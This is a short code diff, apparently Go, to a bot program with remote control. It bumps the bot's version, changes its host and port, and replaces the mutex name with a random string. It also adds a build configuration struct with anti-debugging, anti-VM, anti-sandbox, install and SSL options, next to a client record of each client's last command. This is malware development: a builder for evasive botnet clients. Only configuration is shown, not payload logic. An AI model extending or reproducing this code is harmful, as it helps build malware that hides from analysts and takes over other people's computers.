@@ -73,8 +73,8 @@ var (
 	pfnGetCurrentProcess   = kernel32.NewProc("GetCurrentProcess")
 
 	botcore = BotCore{
-		version:      "1.4.4",
-		hosts:        []string{"127.0.0.1:8080"},
+		version:      "1.5.4",
+		hosts:        []string{"127.0.0.1:3596"},
 		singleton:    true,
 		anti_debug:   false,
 		anti_vm:      false,
@@ -82,7 +82,7 @@ var (
 		install:      false,
 		use_ssl:      false,
 		delay:        0,
-		mutex_name:   "heelo",
+		mutex_name:   "eSq3w0KtD7gDMR7q",
 		install_file: "",
 		install_path: "",
 	}
@@ -157,4 +157,18 @@ type Client struct {
 	Version     string `json:"version"`
 	Lastseen    string `json:"lastseen"`
 	Lastcommand string `json:"lastcommand"`
+}
+
+type BuildConfig struct {
+	Version      string   `json:"version"`
+	Host         []string `json:"host"`
+	Single       bool     `json:"single"`
+	Anti_debug   bool     `json:"anti_debug"`
+	Anti_vm      bool     `json:"anti_vm"`
+	Anti_sandbox bool     `json:"anti_sandbox"`
+	Install      bool     `json:"install"`
+	Install_file string   `json:"file"`
+	Mutex_name   string   `json:"mutex"`
+	Delay        uint     `json:"delay"`
+	Use_ssl      bool     `json:"ssl"`
 }
